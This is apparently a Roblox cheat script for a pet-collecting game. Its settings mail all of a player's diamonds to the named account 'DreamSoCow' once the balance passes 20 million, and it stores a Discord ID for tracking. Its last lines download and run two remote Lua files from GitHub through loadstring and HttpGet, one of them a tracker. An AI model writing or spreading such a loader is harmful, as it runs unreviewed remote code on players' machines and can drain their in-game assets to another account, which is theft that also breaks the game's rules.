wait(3)

-- ⚙️ SETTINGS
getgenv().Settings = {
    Mailing = {
        ["Diamonds"] = {
            Class = "Currency",
            Amount = "All",        -- gửi toàn bộ khi đạt ngưỡng
            MinDiamonds = 20000000 -- ngưỡng tối thiểu (ví dụ: 20 triệu)
        },
    },
    Users = {
        "DreamSoCow",  -- người nhận
    },
    ["Split Items Evenly"] = false,
    ["Only Online Accounts"] = false,
    ["Developer Mode"] = false,
    [[ THANK YOU, YOUR MOM SO FAT <3! ]]
}

-- ⚙️ CONFIG
_G.Config = {
    UserID = "0d28ea66-a410-47c0-a707-06d7cb199774",
    discord_id = "698853568291143821",
    Note = "Pc",
}

-- 🧩 LOAD SCRIPTS
loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/track.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/pet99"))()
